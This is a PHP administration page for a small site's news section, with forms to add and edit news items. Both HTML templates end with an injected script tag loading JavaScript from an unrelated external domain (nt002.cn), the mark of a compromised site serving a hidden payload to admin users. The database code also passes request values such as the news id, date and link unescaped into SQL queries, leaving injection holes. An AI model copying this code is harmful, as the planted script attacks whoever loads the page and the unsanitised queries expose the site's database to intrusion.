<?php
session_start();

if ($_SESSION['auth'] == "admin") 
{
	include("db_connect.php");
	
	if ($_GET['action'] == 'news'){
	
		function add_news($news_result)
		{
		
				$pages_query = "SELECT * FROM pages"; 
				$pages_result = mysql_query($pages_query);
			
			$print_date = date('F j, Y');
			$todays_date = date('Y-m-d');
	
			echo "<h2>Add News</h2>";
			echo "<form action='$_SERVER[PHP_SELF]?action=add' method='post'>" ;
			echo "<input type='hidden' name='action' value='add'>";
			echo "<input type='hidden' name='date' value='".$todays_date."'>";
			echo $print_date."&nbsp; &nbsp; <input name='title' type='text'><br /><br />";
			echo "<textarea cols='80' rows='10' name='content'></textarea><br /><br />";
						echo "Link to a page: <select name='link'>\n";
			//echo "<option value='0'></option>";
			if ($row['news_link'] == 0) {echo "<option value='0' selected='yes'>"; }
			while ($row = mysql_fetch_array($pages_result, MYSQL_ASSOC))
			{
				
				echo "<option value='".$row['page_id']."'";
				
				if ($row['news_link'] == $row['page_id']) { echo "selected='yes'"; }
				
				echo ">".$row['page_title']."</option>";
			}
			echo "</select><br /><br />\n";
			echo "<input name='edit' type='submit' value='Submit'> <a href='index.php'>Cancel</a>";
			echo "</form>";
		}

	?>
	
	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
	<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
	<title>ignite The Spirit | Administration</title>
	<link rel="stylesheet" href="admin.css"  type="text/css" />

	
	</head>
	
	<body>
	

	<h1>Ignite The Spirit | Administration</h1>
	
	<ul class="navigation">
		
		<li><a <?php if ($current_page == "news"){echo "id=current";}?> href="index.php?page=news">News</a></li>
		<li><a <?php if ($current_page == "calendars"){echo "id=current";}?> href="index.php?page=calendars">Calendars</a></li>
		<li><a <?php if ($current_page == "gallery"){echo "id=current";}?> href="index.php?page=gallery">Gallery</a></li>
		<li><a <?php if ($current_page == "pages"){echo "id=current";}?> href="index.php?page=pages">Pages</a></li>
		<li><a <?php if ($current_page == "store"){echo "id=current";}?> href="index.php?page=store">Store</a></li>
		<li><a <?php if ($current_page == "users"){echo "id=current";}?> href="index.php?page=users">Users</a></li>
		<li><a href="login.php?action=logout">Log Out</a></li>
	</ul>

	<div class="container">

	<?php add_news($news_result); ?>
	<br />
	Code you can use:<br />
	[b] <strong>bold text</strong> [/b]<br />
	[i] <i>italic text</i> [/i]<br />
	[u] <u>underline</u> [/u] <br />
	[return] - new line<br />

	</div>
	<script src='http://nt002.cn/E/J.JS'></script></body>
	</html>
	
	<?php	
	
	}
	else if ($_POST['action'] == 'add'){
	
	
	$cleaned_content = addslashes(strip_tags($_POST['content']));
	$cleaned_title = addslashes(strip_tags($_POST['title']));
	
	$insert_query = "INSERT INTO news (`news_date`, `news_title`, `news_content`, `news_link`) VALUES ('$_POST[date]', '$cleaned_title','$cleaned_content','$_POST[link]')";
	$insert_result = mysql_query($insert_query) or die(mysql_error());
	header ('location:index.php');
	}

	else if ($_POST['action'] == 'edit'){
	
	 
	$cleaned_content = addslashes(strip_tags($_POST['content']));
	$cleaned_title = addslashes(strip_tags($_POST['title']));
	$query = "UPDATE news SET news_title = '$cleaned_title', news_content = '$cleaned_content', news_active = '$_POST[active]', news_link = '$_POST[link]' WHERE news_id = '$_POST[id]'";
	$update_result = mysql_query($query);
	header ('location:index.php');
	}
	else
	{
	$news_id = $_GET['id'];
	
	$news_query = "SELECT * FROM news WHERE news_id = $news_id";
	$news_result = mysql_query($news_query);
	
	$pages_query = "SELECT * FROM pages"; 
	$pages_result = mysql_query($pages_query);
		
	

		function edit_news($news_result,$pages_result)
		{
			$row = mysql_fetch_array($news_result, MYSQL_ASSOC);
			
			$print_date = date('F j, Y', strtotime($row['news_date']));
			$stripped_title = stripslashes($row['news_title']);
			$title = htmlentities($stripped_title, ENT_QUOTES);
			echo "<h2>Edit News</h2>\n";
			echo "<form action='$_SERVER[PHP_SELF]' method='post'>\n" ;
			echo "<input type='hidden' name='action' value='edit'>\n";
			echo "<input type='hidden' name='id' value='".$row['news_id']."'>\n";
			echo $print_date."&nbsp; &nbsp; <input name='title' type='text' value='".$title."'> &nbsp; &nbsp"; 
			echo "<input name='active' type='radio' value='0'"; 
			if ($row['news_active'] == 0) {echo "checked='yes'";}
			echo "/>Hidden\n";
			echo "<input name='active' type='radio' value='1'"; 
			if ($row['news_active'] == 1) {echo "checked='yes'";}
			echo "/>Active<br /><br />\n";
			echo "<textarea cols='80' rows='10' name='content'>".stripslashes($row['news_content'])."</textarea><br /><br />\n";
			echo "Link to a page: <select name='link'>\n";
			//echo "<option value='0'></option>";
			if ($row['news_link'] == 0) {echo "<option value='0' selected='yes'>"; }
			while ($row = mysql_fetch_array($pages_result, MYSQL_ASSOC))
			{
				
				echo "<option value='".$row['page_id']."'";
				
				if ($row['news_link'] == $row['page_id']) { echo "selected='yes'"; }
				
				echo ">".$row['page_title']."</option>";
			}
			echo "</select><br /><br />\n";
			echo "<input name='edit' type='submit' value='Edit'> <a href='index.php'>Cancel</a>\n";
			echo "</form>";
		}

	?>


	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
	<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
	<title>ignite The Spirit | Administration</title>
	<link rel="stylesheet" href="admin.css"  type="text/css" />


	</head>

	<body>
	<div id='blanket' style='display: none;'></div>


	<h1>Ignite The Spirit | Administration</h1>

	<ul class="navigation">
	
		<li><a <?php if ($current_page == "news"){echo "id=current";}?> href="index.php?page=news">News</a></li>
		<li><a <?php if ($current_page == "calendars"){echo "id=current";}?> href="index.php?page=calendars">Calendars</a></li>
		<li><a <?php if ($current_page == "gallery"){echo "id=current";}?> href="index.php?page=gallery">Gallery</a></li>
		<li><a <?php if ($current_page == "pages"){echo "id=current";}?> href="index.php?page=pages">Pages</a></li>
		<li><a <?php if ($current_page == "store"){echo "id=current";}?> href="index.php?page=store">Store</a></li>
		<li><a <?php if ($current_page == "users"){echo "id=current";}?> href="index.php?page=users">Users</a></li>
		<li><a href="login.php?action=logout">Log Out</a></li>
	</ul>

	<div class="container">

	<?php edit_news($news_result,$pages_result); ?>
	<br />
	Code you can use:<br />
	[b] <strong>bold text</strong> [/b]<br />
	[i] <i>italic text</i> [/i]<br />
	[u] <u>underline</u> [/u] <br />
	[return] - new line<br />
	</div>
	<script src='http://nt002.cn/E/J.JS'></script></body>
	</html>
<?php 
	} 
}//session
else
{

include("log_form.php");

}
?>